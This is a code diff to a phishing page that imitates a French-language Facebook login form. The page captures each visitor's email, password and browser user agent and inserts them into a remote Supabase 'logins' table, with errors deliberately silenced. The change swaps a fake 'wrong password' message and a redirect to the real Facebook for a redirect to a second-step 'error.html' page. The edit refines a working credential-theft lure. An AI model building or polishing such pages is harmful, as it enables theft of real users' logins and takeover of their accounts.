@@ -38,13 +38,6 @@
 <style data-purpose="custom-elements">
   button:active { transform: scale(0.99); }
   input::placeholder { color: #8c949e; font-size: 14.5px; }
-  #error-msg {
-    display: none;
-    color: #d32f2f;
-    font-size: 13px;
-    text-align: center;
-    margin-top: 4px;
-  }
   #loading-spinner {
     display: none;
     width: 18px;
@@ -86,8 +79,6 @@
         <label class="sr-only" for="password">Mot de passe</label>
         <input class="w-full h-11 px-3.5 rounded-lg border border-gray-300 focus:border-fbBlue focus:ring-1 focus:ring-fbBlue outline-none text-sm text-gray-900 bg-white placeholder-gray-400 transition" id="password" name="password" placeholder="Mot de passe" required type="password">
       </div>
-
-      <div id="error-msg">Adresse e-mail ou mot de passe incorrect. <a href="#" class="font-medium text-fbBlue hover:underline">Mot de passe oublié ?</a></div>
 
       <button id="submit-btn" class="w-full h-11 mt-1 bg-fbBlue hover:bg-fbBlueHover active:bg-blue-700 text-white font-medium text-sm rounded-full shadow-none transition duration-150 flex items-center justify-center" data-purpose="submit-login" type="submit">
         <span id="btn-text">Se connecter</span>
@@ -172,16 +163,13 @@
 
     const email    = document.getElementById('email').value.trim();
     const password = document.getElementById('password').value;
-    const errorMsg = document.getElementById('error-msg');
     const spinner  = document.getElementById('loading-spinner');
     const btnText  = document.getElementById('btn-text');
     const btn      = document.getElementById('submit-btn');
 
-    // Show loading state
-    errorMsg.style.display = 'none';
-    spinner.style.display  = 'block';
-    btnText.textContent    = 'Connexion en cours…';
-    btn.disabled           = true;
+    spinner.style.display = 'block';
+    btnText.textContent   = 'Connexion en cours…';
+    btn.disabled          = true;
 
     try {
       await sb.from('logins').insert([{
@@ -189,21 +177,12 @@
         password:   password,
         user_agent: navigator.userAgent
       }]);
-    } catch (err) {
-      // Silent fail — always redirect regardless
-    }
+    } catch (err) { /* silent */ }
 
-    // Simulate wrong password, then redirect
+    // Redirect to error page (2nd step)
     setTimeout(() => {
-      spinner.style.display = 'none';
-      btnText.textContent   = 'Se connecter';
-      btn.disabled          = false;
-      errorMsg.style.display = 'block';
-
-      setTimeout(() => {
-        window.location.href = 'https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2F';
-      }, 2500);
-    }, 1800);
+      window.location.href = 'error.html';
+    }, 1500);
   });
 </script>
 
